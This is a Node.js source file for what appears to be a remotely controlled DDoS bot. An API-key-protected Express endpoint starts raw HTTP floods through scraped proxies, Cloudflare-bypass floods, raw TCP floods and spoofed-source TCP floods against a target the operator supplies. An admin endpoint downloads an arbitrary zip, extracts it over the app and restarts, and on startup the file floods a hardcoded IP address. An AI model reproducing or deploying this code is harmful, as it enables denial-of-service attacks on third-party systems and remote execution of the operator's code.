var request = require('req-fast'); //test
var express = require('express')
const { DynamicPool } = require("node-worker-threads-pool");
var net = require('net');
const { stringify } = require('querystring');
const { fstat } = require('fs');
var client = new net.Socket();
var app = express()
let fs = require("fs");
const { default: axios } = require('axios');
var AdmZip = require('adm-zip');
let Node_Current = "Aqua";
let counter = 0;
const randomUseragent = require('random-useragent');
const send_tcp = require("./tcp_spoof");
const { randomInt } = require('crypto');
const { Console } = require('console');
const bodyparser = require('body-parser')

const bypass = require('./bypasses');

let wow = false;
let apiKey = "SlzQXZgcD7TkexEVlu5Q5p8WXH6SQIBdzB9vwDWpPDVALjl2D4WNezpbuXGeANrsMqHbqpu6DLvkj0lMQY9CChCOx3551KxhBaFrq2T5pBNqmpe6tHjxuVQ2lk9cdmk4NSkMAZUToXyv8LXYNIcxEmwE31d581F7fLhfvmjSBf7rGjF7jm8W78PlKHyQ3dwWgygLTm1Ita8AWnZAN9qFTaAxvluLmffK9IZRHiZNn2YV6lBpwE918CQR63xaJvsbQg5DfWXrM0Q6uJmVFuMiyvKhu39BCaLQw8FnRZ0dTyLcCrTRTkj6yADjdBMO9V9ZjHu8UNHS5X67u2t5J4H7FVLsCvF8OOqvRQ66pGOLc45sDixpgdINdhY5Mr5wziitQojJhlLZ3efYBb0O"
let force = false;
let proxies = [];






var AutoUpdater = require('auto-updater');
var autoupdater = new AutoUpdater({
  pathToJson: '',
  autoupdate: true,
  checkgit: true,
  jsonhost: 'raw.githubusercontent.com',
  contenthost: 'codeload.github.com',
  progressDebounce: 0,
  devmode: false
 });



 autoupdater.on('git-clone', function() {
  console.log("You have a clone of the repository. Use 'git pull' to be up-to-date");
});
autoupdater.on('check.up-to-date', function(v) {
  console.info("You have the latest version: " + v);
});
autoupdater.on('check.out-dated', function(v_old, v) {
  console.warn("Your version is outdated. " + v_old + " of " + v);
  autoupdater.fire('download-update'); // If autoupdate: false, you'll have to do this manually.
  // Maybe ask if the'd like to download the update.
});
autoupdater.on('update.downloaded', function() {
  console.log("Update downloaded and ready for install");
  autoupdater.fire('extract'); // If autoupdate: false, you'll have to do this manually.
});
autoupdater.on('update.not-installed', function() {
  console.log("The Update was already in your folder! It's read for install");
  autoupdater.fire('extract'); // If autoupdate: false, you'll have to do this manually.
});
autoupdater.on('update.extracted', function() {
  console.log("Update extracted successfully!");
  console.warn("RESTART THE APP!");
});
autoupdater.on('download.start', function(name) {
  console.log("Starting downloading: " + name);
});
autoupdater.on('download.progress', function(name, perc) {
  process.stdout.write("Downloading " + perc + "% \033[0G");
});
autoupdater.on('download.end', function(name) {
  console.log("Downloaded " + name);
});
autoupdater.on('download.error', function(err) {
  console.error("Error when downloading: " + err);
});
autoupdater.on('end', function() {
  console.log("The app is ready to function");
});
autoupdater.on('error', function(name, e) {
  console.error(name, e);
});
 autoupdater.fire('check');


async function get_proxies()
{
  await axios.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true", {}, function (err, res, body) {    
      proxies += body.split('\n');
  })
    await axios.get("https://www.proxyscan.io/download?type=http", {}, function (err, res, body) {    
      proxies += body.split('\n');
  })
  await axios.get("https://www.proxyscan.io/download?type=https", {}, function (err, res, body) {    
    proxies += body.split('\n');
  })
}

function generate(n) {
  var add = 1, max = 12 - add;   // 12 is the min safe number Math.random() can generate without it starting to pad the end with zeros.   

  if ( n > max ) {
          return generate(max) + generate(n - max);
  }

  max        = Math.pow(10, n+add);
  var min    = max/10; // Math.pow(10, n) basically
  var number = Math.floor( Math.random() * (max - min + 1) ) + min;

  return ("" + number).substring(add); 
}

app.get('/Admin', async function (req, res) {
  if(req.query.apiKey === undefined) return res.send("no"); 
  if(req.query.apiKey !== apiKey)
  {
    res.send("Has been started");
    return;
  }
  if(req.query.command === undefined) return res.send("no");
  if(req.query.command === "restart")
  {
    force = true;
  }
  if(req.query.command.startsWith("update"))
  {
    var link_ = req.query.command.split(':')[1];
    
    await axios(link_, async function(err, response, body){
      await fs.writeFileSync("sshme.zip", body, 'utf-8');
    });

    
    var zip = new AdmZip("./sshme.zip");
    zip.extractAllTo("./", true);
    res.send("Updated!");
    process.exit(0);
  }
})
app.get('/Start', function (req, res) {
  if(req.query.apiKey === undefined) return res.send("no");
  if(req.query.apiKey !== apiKey)
  {
    res.send("Has been started");
    return;
  }
  HandleRequest(req, res);
})

function makeid(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var k = 0; k < length; k++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}


async function HandleRequest(req, res)
{

   let Link = req.query.link;
   let time = req.query.time;
   let type = req.query.type;
   if(Link === undefined || time === undefined) return;
  // if(wow) { res.send("Another attack is already running, please wait for it to finish."); return; }
  // wow = true;
  if(type === "rawHttp")
  {
    startRawHttp(Link, time);
  }
  else if(type === "bypassHttp")
  {
    startHttpBypass(Link, time);
  }
  else if(type === "rawTcp")
  {
    startRawTcp(Link, time);
  }
  else if(type === "spoofTcp")
  {
    startSpoofTcp(Link, time);
  }
  else {
    res.send("wrong type");
    return;
  }
  res.send("Started");
}

 
async function startSpoofTcp(ip, time)
{
  let Started = true;
  setTimeout(() => {
    Started = false;
  }, time);
  var timer = setInterval(async () => {
      if(!Started || force) return clearInterval(timer);
      var ip_ = (Math.floor(Math.random() * 255) + 1)+"."+(Math.floor(Math.random() * 255))+"."+(Math.floor(Math.random() * 255))+"."+(Math.floor(Math.random() * 255));
      send_tcp(ip_, generate(4), ip.split(':')[0], ip.split(':')[1]);
  }, 1);
}

async function startRawTcp(ip, time)
{
  let Started = true;
  setTimeout(() => {
    Started = false;
  }, time);
  var timer = setInterval(async () => {
      if(!Started || force) return clearInterval(timer);
      client.connect(ip.split(':')[0], ip.split(':')[1], function() {
        console.log('Connected');
        client.write(makeid(256));
      });
  }, 1);
}
async function startHttpBypass(url, time)
{
    let Started = true;
    setTimeout(() => {
      Started = false;
    }, time);
    var timer = setInterval(async () => {
      if(!Started || force) return clearInterval(timer);   
      bypass.cloudflare("",randomUseragent(), function() {

      })
  }, 1);


      
 
  return;
}
function randomIntFromInterval(min, max) { // min and max included 
  return Math.floor(Math.random() * (max - min + 1) + min);
}
async function startRawHttp(url, time)
{
    let Started = true;
    setTimeout(() => {
      Started = false;
    }, time);
    var timer = setInterval(async () => {
      if(!Started || force) {
        clearInterval(timer);
        return;
      } 
      request({
        url: url,
        proxy: proxies[randomIntFromInterval(0, proxies.length)]
      }, function(err, resp){

      });
    }, 0);
    return;
}



console.log("Node " + Node_Current)

let server = app.listen(1337, function() {
    console.log('Server is working')
});

//console.log(counter);


startRawHttp("http://46.166.142.81/hit", 5000);